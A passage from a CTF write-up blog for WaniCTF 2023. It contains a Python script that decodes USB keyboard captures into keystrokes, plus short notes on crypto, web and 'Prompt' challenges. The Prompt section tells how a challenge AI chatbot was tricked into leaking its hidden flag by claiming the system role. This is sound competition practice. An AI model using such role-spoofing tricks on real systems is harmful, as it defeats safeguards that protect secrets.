<h4 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"></span><br><span class="line"><span class="comment">#declare -A lcasekey</span></span><br><span class="line">lcasekey = &#123;&#125;</span><br><span class="line"><span class="comment">#declare -A ucasekey</span></span><br><span class="line">ucasekey = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#associate USB HID scan codes with keys</span></span><br><span class="line"><span class="comment">#ex: key 4  can be both &quot;a&quot; and &quot;A&quot;, depending on if SHIFT is held down</span></span><br><span class="line">lcasekey[<span class="number">4</span>]=<span class="string">&quot;a&quot;</span>;           ucasekey[<span class="number">4</span>]=<span class="string">&quot;A&quot;</span></span><br><span class="line">lcasekey[<span class="number">5</span>]=<span class="string">&quot;b&quot;</span>;           ucasekey[<span class="number">5</span>]=<span class="string">&quot;B&quot;</span></span><br><span class="line">lcasekey[<span class="number">6</span>]=<span class="string">&quot;c&quot;</span>;           ucasekey[<span class="number">6</span>]=<span class="string">&quot;C&quot;</span></span><br><span class="line">lcasekey[<span class="number">7</span>]=<span class="string">&quot;d&quot;</span>;           ucasekey[<span class="number">7</span>]=<span class="string">&quot;D&quot;</span></span><br><span class="line">lcasekey[<span class="number">8</span>]=<span class="string">&quot;e&quot;</span>;           ucasekey[<span class="number">8</span>]=<span class="string">&quot;E&quot;</span></span><br><span class="line">lcasekey[<span class="number">9</span>]=<span class="string">&quot;f&quot;</span>;           ucasekey[<span class="number">9</span>]=<span class="string">&quot;F&quot;</span></span><br><span class="line">lcasekey[<span class="number">10</span>]=<span class="string">&quot;g&quot;</span>;          ucasekey[<span class="number">10</span>]=<span class="string">&quot;G&quot;</span></span><br><span class="line">lcasekey[<span class="number">11</span>]=<span class="string">&quot;h&quot;</span>;          ucasekey[<span class="number">11</span>]=<span class="string">&quot;H&quot;</span></span><br><span class="line">lcasekey[<span class="number">12</span>]=<span class="string">&quot;i&quot;</span>;          ucasekey[<span class="number">12</span>]=<span class="string">&quot;I&quot;</span></span><br><span class="line">lcasekey[<span class="number">13</span>]=<span class="string">&quot;j&quot;</span>;          ucasekey[<span class="number">13</span>]=<span class="string">&quot;J&quot;</span></span><br><span class="line">lcasekey[<span class="number">14</span>]=<span class="string">&quot;k&quot;</span>;          ucasekey[<span class="number">14</span>]=<span class="string">&quot;K&quot;</span></span><br><span class="line">lcasekey[<span class="number">15</span>]=<span class="string">&quot;l&quot;</span>;          ucasekey[<span class="number">15</span>]=<span class="string">&quot;L&quot;</span></span><br><span class="line">lcasekey[<span class="number">16</span>]=<span class="string">&quot;m&quot;</span>;          ucasekey[<span class="number">16</span>]=<span class="string">&quot;M&quot;</span></span><br><span class="line">lcasekey[<span class="number">17</span>]=<span class="string">&quot;n&quot;</span>;          ucasekey[<span class="number">17</span>]=<span class="string">&quot;N&quot;</span></span><br><span class="line">lcasekey[<span class="number">18</span>]=<span class="string">&quot;o&quot;</span>;          ucasekey[<span class="number">18</span>]=<span class="string">&quot;O&quot;</span></span><br><span class="line">lcasekey[<span class="number">19</span>]=<span class="string">&quot;p&quot;</span>;          ucasekey[<span class="number">19</span>]=<span class="string">&quot;P&quot;</span></span><br><span class="line">lcasekey[<span class="number">20</span>]=<span class="string">&quot;q&quot;</span>;          ucasekey[<span class="number">20</span>]=<span class="string">&quot;Q&quot;</span></span><br><span class="line">lcasekey[<span class="number">21</span>]=<span class="string">&quot;r&quot;</span>;          ucasekey[<span class="number">21</span>]=<span class="string">&quot;R&quot;</span></span><br><span class="line">lcasekey[<span class="number">22</span>]=<span class="string">&quot;s&quot;</span>;          ucasekey[<span class="number">22</span>]=<span class="string">&quot;S&quot;</span></span><br><span class="line">lcasekey[<span class="number">23</span>]=<span class="string">&quot;t&quot;</span>;          ucasekey[<span class="number">23</span>]=<span class="string">&quot;T&quot;</span></span><br><span class="line">lcasekey[<span class="number">24</span>]=<span class="string">&quot;u&quot;</span>;          ucasekey[<span class="number">24</span>]=<span class="string">&quot;U&quot;</span></span><br><span class="line">lcasekey[<span class="number">25</span>]=<span class="string">&quot;v&quot;</span>;          ucasekey[<span class="number">25</span>]=<span class="string">&quot;V&quot;</span></span><br><span class="line">lcasekey[<span class="number">26</span>]=<span class="string">&quot;w&quot;</span>;          ucasekey[<span class="number">26</span>]=<span class="string">&quot;W&quot;</span></span><br><span class="line">lcasekey[<span class="number">27</span>]=<span class="string">&quot;x&quot;</span>;          ucasekey[<span class="number">27</span>]=<span class="string">&quot;X&quot;</span></span><br><span class="line">lcasekey[<span class="number">28</span>]=<span class="string">&quot;y&quot;</span>;          ucasekey[<span class="number">28</span>]=<span class="string">&quot;Y&quot;</span></span><br><span class="line">lcasekey[<span class="number">29</span>]=<span class="string">&quot;z&quot;</span>;          ucasekey[<span class="number">29</span>]=<span class="string">&quot;Z&quot;</span></span><br><span class="line">lcasekey[<span class="number">30</span>]=<span class="string">&quot;1&quot;</span>;          ucasekey[<span class="number">30</span>]=<span class="string">&quot;!&quot;</span></span><br><span class="line">lcasekey[<span class="number">31</span>]=<span class="string">&quot;2&quot;</span>;          ucasekey[<span class="number">31</span>]=<span class="string">&quot;@&quot;</span></span><br><span class="line">lcasekey[<span class="number">32</span>]=<span class="string">&quot;3&quot;</span>;          ucasekey[<span class="number">32</span>]=<span class="string">&quot;#&quot;</span></span><br><span class="line">lcasekey[<span class="number">33</span>]=<span class="string">&quot;4&quot;</span>;          ucasekey[<span class="number">33</span>]=<span class="string">&quot;$&quot;</span></span><br><span class="line">lcasekey[<span class="number">34</span>]=<span class="string">&quot;5&quot;</span>;          ucasekey[<span class="number">34</span>]=<span class="string">&quot;%&quot;</span></span><br><span class="line">lcasekey[<span class="number">35</span>]=<span class="string">&quot;6&quot;</span>;          ucasekey[<span class="number">35</span>]=<span class="string">&quot;^&quot;</span></span><br><span class="line">lcasekey[<span class="number">36</span>]=<span class="string">&quot;7&quot;</span>;          ucasekey[<span class="number">36</span>]=<span class="string">&quot;&amp;&quot;</span></span><br><span class="line">lcasekey[<span class="number">37</span>]=<span class="string">&quot;8&quot;</span>;          ucasekey[<span class="number">37</span>]=<span class="string">&quot;*&quot;</span></span><br><span class="line">lcasekey[<span class="number">38</span>]=<span class="string">&quot;9&quot;</span>;          ucasekey[<span class="number">38</span>]=<span class="string">&quot;(&quot;</span></span><br><span class="line">lcasekey[<span class="number">39</span>]=<span class="string">&quot;0&quot;</span>;          ucasekey[<span class="number">39</span>]=<span class="string">&quot;)&quot;</span></span><br><span class="line">lcasekey[<span class="number">40</span>]=<span class="string">&quot;Enter&quot;</span>;      ucasekey[<span class="number">40</span>]=<span class="string">&quot;Enter&quot;</span></span><br><span class="line">lcasekey[<span class="number">41</span>]=<span class="string">&quot;esc&quot;</span>;        ucasekey[<span class="number">41</span>]=<span class="string">&quot;esc&quot;</span></span><br><span class="line">lcasekey[<span class="number">42</span>]=<span class="string">&quot;del&quot;</span>;        ucasekey[<span class="number">42</span>]=<span class="string">&quot;del&quot;</span></span><br><span class="line">lcasekey[<span class="number">43</span>]=<span class="string">&quot;tab&quot;</span>;        ucasekey[<span class="number">43</span>]=<span class="string">&quot;tab&quot;</span></span><br><span class="line">lcasekey[<span class="number">44</span>]=<span class="string">&quot;space&quot;</span>;      ucasekey[<span class="number">44</span>]=<span class="string">&quot;space&quot;</span></span><br><span class="line">lcasekey[<span class="number">45</span>]=<span class="string">&quot;-&quot;</span>;          ucasekey[<span class="number">45</span>]=<span class="string">&quot;_&quot;</span></span><br><span class="line">lcasekey[<span class="number">46</span>]=<span class="string">&quot;=&quot;</span>;          ucasekey[<span class="number">46</span>]=<span class="string">&quot;+&quot;</span></span><br><span class="line">lcasekey[<span class="number">47</span>]=<span class="string">&quot;[&quot;</span>;          ucasekey[<span class="number">47</span>]=<span class="string">&quot;&#123;&quot;</span></span><br><span class="line">lcasekey[<span class="number">48</span>]=<span class="string">&quot;]&quot;</span>;          ucasekey[<span class="number">48</span>]=<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">lcasekey[<span class="number">49</span>]=<span class="string">&quot;\\&quot;</span>;         ucasekey[<span class="number">49</span>]=<span class="string">&quot;|&quot;</span></span><br><span class="line">lcasekey[<span class="number">50</span>]=<span class="string">&quot; &quot;</span>;          ucasekey[<span class="number">50</span>]=<span class="string">&quot; &quot;</span></span><br><span class="line">lcasekey[<span class="number">51</span>]=<span class="string">&quot;;&quot;</span>;          ucasekey[<span class="number">51</span>]=<span class="string">&quot;:&quot;</span></span><br><span class="line">lcasekey[<span class="number">52</span>]=<span class="string">&quot;&#x27;&quot;</span>;          ucasekey[<span class="number">52</span>]=<span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">lcasekey[<span class="number">53</span>]=<span class="string">&quot;`&quot;</span>;          ucasekey[<span class="number">53</span>]=<span class="string">&quot;~&quot;</span></span><br><span class="line">lcasekey[<span class="number">54</span>]=<span class="string">&quot;,&quot;</span>;          ucasekey[<span class="number">54</span>]=<span class="string">&quot;&lt;&quot;</span></span><br><span class="line">lcasekey[<span class="number">55</span>]=<span class="string">&quot;.&quot;</span>;          ucasekey[<span class="number">55</span>]=<span class="string">&quot;&gt;&quot;</span></span><br><span class="line">lcasekey[<span class="number">56</span>]=<span class="string">&quot;/&quot;</span>;          ucasekey[<span class="number">56</span>]=<span class="string">&quot;?&quot;</span></span><br><span class="line">lcasekey[<span class="number">57</span>]=<span class="string">&quot;CapsLock&quot;</span>;   ucasekey[<span class="number">57</span>]=<span class="string">&quot;CapsLock&quot;</span></span><br><span class="line">lcasekey[<span class="number">79</span>]=<span class="string">&quot;RightArrow&quot;</span>; ucasekey[<span class="number">79</span>]=<span class="string">&quot;RightArrow&quot;</span></span><br><span class="line">lcasekey[<span class="number">80</span>]=<span class="string">&quot;LeftArrow&quot;</span>;  ucasekey[<span class="number">80</span>]=<span class="string">&quot;LeftArrow&quot;</span></span><br><span class="line">lcasekey[<span class="number">84</span>]=<span class="string">&quot;/&quot;</span>;          ucasekey[<span class="number">84</span>]=<span class="string">&quot;/&quot;</span></span><br><span class="line">lcasekey[<span class="number">85</span>]=<span class="string">&quot;*&quot;</span>;          ucasekey[<span class="number">85</span>]=<span class="string">&quot;*&quot;</span></span><br><span class="line">lcasekey[<span class="number">86</span>]=<span class="string">&quot;-&quot;</span>;          ucasekey[<span class="number">86</span>]=<span class="string">&quot;-&quot;</span></span><br><span class="line">lcasekey[<span class="number">87</span>]=<span class="string">&quot;+&quot;</span>;          ucasekey[<span class="number">87</span>]=<span class="string">&quot;+&quot;</span></span><br><span class="line">lcasekey[<span class="number">88</span>]=<span class="string">&quot;Enter&quot;</span>;      ucasekey[<span class="number">88</span>]=<span class="string">&quot;Enter&quot;</span></span><br><span class="line">lcasekey[<span class="number">89</span>]=<span class="string">&quot;1&quot;</span>;          ucasekey[<span class="number">89</span>]=<span class="string">&quot;1&quot;</span></span><br><span class="line">lcasekey[<span class="number">90</span>]=<span class="string">&quot;2&quot;</span>;          ucasekey[<span class="number">90</span>]=<span class="string">&quot;2&quot;</span></span><br><span class="line">lcasekey[<span class="number">91</span>]=<span class="string">&quot;3&quot;</span>;          ucasekey[<span class="number">91</span>]=<span class="string">&quot;3&quot;</span></span><br><span class="line">lcasekey[<span class="number">92</span>]=<span class="string">&quot;4&quot;</span>;          ucasekey[<span class="number">92</span>]=<span class="string">&quot;4&quot;</span></span><br><span class="line">lcasekey[<span class="number">93</span>]=<span class="string">&quot;5&quot;</span>;          ucasekey[<span class="number">93</span>]=<span class="string">&quot;5&quot;</span></span><br><span class="line">lcasekey[<span class="number">94</span>]=<span class="string">&quot;6&quot;</span>;          ucasekey[<span class="number">94</span>]=<span class="string">&quot;6&quot;</span></span><br><span class="line">lcasekey[<span class="number">95</span>]=<span class="string">&quot;7&quot;</span>;          ucasekey[<span class="number">95</span>]=<span class="string">&quot;7&quot;</span></span><br><span class="line">lcasekey[<span class="number">96</span>]=<span class="string">&quot;8&quot;</span>;          ucasekey[<span class="number">96</span>]=<span class="string">&quot;8&quot;</span></span><br><span class="line">lcasekey[<span class="number">97</span>]=<span class="string">&quot;9&quot;</span>;          ucasekey[<span class="number">97</span>]=<span class="string">&quot;9&quot;</span></span><br><span class="line">lcasekey[<span class="number">98</span>]=<span class="string">&quot;0&quot;</span>;          ucasekey[<span class="number">98</span>]=<span class="string">&quot;0&quot;</span></span><br><span class="line">lcasekey[<span class="number">99</span>]=<span class="string">&quot;.&quot;</span>;          ucasekey[<span class="number">99</span>]=<span class="string">&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#make sure filename to open has been provided</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span>:</span><br><span class="line">	keycodes = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> keycodes:</span><br><span class="line">		<span class="comment">#dump line to bytearray</span></span><br><span class="line">		bytesArray = <span class="built_in">bytearray</span>.fromhex(line.strip())</span><br><span class="line">		<span class="comment">#see if we have a key code</span></span><br><span class="line">		val = <span class="built_in">int</span>(bytesArray[<span class="number">2</span>])</span><br><span class="line">		<span class="keyword">if</span> val &gt; <span class="number">3</span> <span class="keyword">and</span> val &lt; <span class="number">100</span>:</span><br><span class="line">			<span class="comment">#see if left shift or right shift was held down</span></span><br><span class="line">			<span class="keyword">if</span> bytesArray[<span class="number">0</span>] == <span class="number">0x02</span> <span class="keyword">or</span> bytesArray[<span class="number">0</span>] == <span class="number">0x20</span> :</span><br><span class="line">				<span class="built_in">print</span>(ucasekey[<span class="built_in">int</span>(bytesArray[<span class="number">2</span>])], end=<span class="string">&#x27;&#x27;</span>),  <span class="comment">#single line output</span></span><br><span class="line">				<span class="comment">#print(ucasekey[int(bytesArray[2])])            #newline output</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="built_in">print</span>(lcasekey[<span class="built_in">int</span>(bytesArray[<span class="number">2</span>])], end=<span class="string">&#x27;&#x27;</span>),  <span class="comment">#single line output</span></span><br><span class="line">				<span class="comment">#print(lcasekey[int(bytesArray[2])])            #newline output</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;USAGE: python %s [filename]&quot;</span> % os.path.basename(__file__))</span><br></pre></td></tr></table></figure>


<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Prompt"><a href="#Prompt" class="headerlink" title="Prompt"></a>Prompt</h3><h4 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h4><p><img src="/imgs/post4/misc/prompt_desc.png" alt="prompt_desc"></p>
<p>going through <code>main.py</code> file given got this section that seems flag will be visible if role is system and whatnot (just guessed)</p>
<p><img src="/imgs/post4/misc/prompt.png" alt="prompt"></p>
<p>i tried this one and got the flag</p>
<p><img src="/imgs/post4/misc/prompt_flag.png" alt="prompt_flag"></p>
<p>i dont know the intended way to solve this challenge as second time it didnt work.</p>
<p>playing with some question containg <strong>flag</strong> word got another hit , as this ai bot can be trick</p>
<p><img src="/imgs/post4/misc/promt_flag2.png" alt="prompt_flag2"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="EZDORSA-Lv1"><a href="#EZDORSA-Lv1" class="headerlink" title="EZDORSA_Lv1"></a>EZDORSA_Lv1</h3><p><img src="imgs/post4/crypto/crypto1.png" alt="crypto1.png"></p>
<p>you know what time it is? its chatGPT time :p</p>
<p><img src="/imgs/post4/crypto/crypto1.gif" alt="crypto1.gif"></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="IndexedDB"><a href="#IndexedDB" class="headerlink" title="IndexedDB"></a>IndexedDB</h3><blockquote>
<p>It appears that the flag has been hidden somewhere on this page. Let’s use the browser’s developer tools to find it.</p>
</blockquote>
<p><img src="/imgs/post4/web/web1.gif" alt="web1.gif"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archive">Writing</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwnable"><span class="toc-number">1.</span> <span class="toc-text">Pwnable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netcat"><span class="toc-number">1.1.</span> <span class="toc-text">netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description"><span class="toc-number">1.1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit"><span class="toc-number">1.1.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#only-once"><span class="toc-number">1.2.</span> <span class="toc-text">only once</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2win"><span class="toc-number">1.3.</span> <span class="toc-text">ret2win</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode-basic"><span class="toc-number">1.4.</span> <span class="toc-text">shellcode_basic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#beginners-ROP"><span class="toc-number">1.5.</span> <span class="toc-text">beginners ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#strategy"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">strategy</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-3"><span class="toc-number">1.5.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#canaleak"><span class="toc-number">1.6.</span> <span class="toc-text">canaleak</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-4"><span class="toc-number">1.6.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-4"><span class="toc-number">1.6.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.7.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-5"><span class="toc-number">1.7.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Exploit-5"><span class="toc-number">1.7.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#time-table"><span class="toc-number">1.8.</span> <span class="toc-text">time table</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rev"><span class="toc-number">2.</span> <span class="toc-text">Rev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-Passw0rd"><span class="toc-number">2.1.</span> <span class="toc-text">Just_Passw0rd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javersing"><span class="toc-number">2.2.</span> <span class="toc-text">javersing</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solve"><span class="toc-number">2.2.1.</span> <span class="toc-text">solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fermat"><span class="toc-number">2.3.</span> <span class="toc-text">fermat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Solve"><span class="toc-number">2.3.1.</span> <span class="toc-text">Solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#theseus"><span class="toc-number">2.4.</span> <span class="toc-text">theseus</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Solve-1"><span class="toc-number">2.4.1.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensic"><span class="toc-number">3.</span> <span class="toc-text">Forensic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-mp4"><span class="toc-number">3.1.</span> <span class="toc-text">Just_mp4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whats-happening"><span class="toc-number">3.2.</span> <span class="toc-text">whats_happening</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lowkey-messedup"><span class="toc-number">3.3.</span> <span class="toc-text">lowkey_messedup</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Solve-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">Solve</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prompt"><span class="toc-number">4.1.</span> <span class="toc-text">Prompt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Description-6"><span class="toc-number">4.1.1.</span> <span class="toc-text">Description</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EZDORSA-Lv1"><span class="toc-number">5.1.</span> <span class="toc-text">EZDORSA_Lv1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">6.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IndexedDB"><span class="toc-number">6.1.</span> <span class="toc-text">IndexedDB</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&text=CTF WriteUp: WaniCTF 2023"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&title=CTF WriteUp: WaniCTF 2023"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&is_video=false&description=CTF WriteUp: WaniCTF 2023"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF WriteUp: WaniCTF 2023&body=Check out this article: https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&title=CTF WriteUp: WaniCTF 2023"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&title=CTF WriteUp: WaniCTF 2023"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&title=CTF WriteUp: WaniCTF 2023"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&title=CTF WriteUp: WaniCTF 2023"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&name=CTF WriteUp: WaniCTF 2023&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sf4ult.github.io/2023/06/08/post4/wanictf_2023/&t=CTF WriteUp: WaniCTF 2023"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    Durgesh
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archive">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/Durge5h/Projects">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
